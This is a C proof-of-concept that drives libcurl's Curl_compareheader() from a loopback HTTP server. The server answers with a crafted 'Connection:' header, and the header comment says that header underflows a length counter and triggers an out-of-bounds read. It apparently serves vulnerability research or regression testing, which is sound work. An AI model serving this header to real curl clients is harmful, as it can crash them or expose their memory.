/*
 * PoC: drives Curl_compareheader() in libcurl through the public API.
 *
 * A loopback HTTP server answers curl_easy_perform() with a crafted
 * "Connection:" response header whose last list token is followed by a
 * comma and trailing blanks only. While matching the token list against
 * "close", the blank skipping moves the parse pointer past the end of the
 * header value and the remaining-length counter underflows, after which
 * the comma search runs with a wild length and reads far past the header
 * buffer.
 */
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <curl/curl.h>

static void *serve_once(void *arg)
{
  int listenfd = *(int *)arg;
  struct timeval tv;
  int fd;
  tv.tv_sec = 15; /* do not block forever if no client shows up */
  tv.tv_usec = 0;
  setsockopt(listenfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  fd = accept(listenfd, NULL, NULL);
  if(fd >= 0) {
    char sink[2048];
    static const char response[] =
      "HTTP/1.1 200 OK\r\n"
      "Connection: aaaaa,   \r\n"
      "Content-Length: 2\r\n"
      "\r\n"
      "ok";
    ssize_t n = read(fd, sink, sizeof(sink)); /* swallow the request */
    (void)n;
    (void)write(fd, response, sizeof(response) - 1);
    close(fd);
  }
  return NULL;
}

static size_t discard(void *ptr, size_t size, size_t nmemb, void *userdata)
{
  (void)ptr;
  (void)userdata;
  return size * nmemb;
}

int main(void)
{
  int listenfd;
  int one = 1;
  struct sockaddr_in addr;
  socklen_t addrlen = sizeof(addr);
  pthread_t server;
  char url[128];
  CURL *easy;
  CURLcode result;

  listenfd = socket(AF_INET, SOCK_STREAM, 0);
  setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0; /* ephemeral */
  if(bind(listenfd, (struct sockaddr *)&addr, sizeof(addr)) ||
     listen(listenfd, 1) ||
     getsockname(listenfd, (struct sockaddr *)&addr, &addrlen)) {
    fprintf(stderr, "socket setup failed\n");
    return 2;
  }

  pthread_create(&server, NULL, serve_once, &listenfd);

  snprintf(url, sizeof(url), "http://127.0.0.1:%u/",
           (unsigned)ntohs(addr.sin_port));

  curl_global_init(CURL_GLOBAL_ALL);
  easy = curl_easy_init();
  curl_easy_setopt(easy, CURLOPT_URL, url);
  curl_easy_setopt(easy, CURLOPT_TIMEOUT, 10L);
  curl_easy_setopt(easy, CURLOPT_NOPROXY, "*");
  curl_easy_setopt(easy, CURLOPT_WRITEFUNCTION, discard);
  result = curl_easy_perform(easy);
  printf("curl_easy_perform: %s (%d)\n", curl_easy_strerror(result),
         (int)result);
  curl_easy_cleanup(easy);
  curl_global_cleanup();

  pthread_join(server, NULL);
  close(listenfd);
  return 0;
}
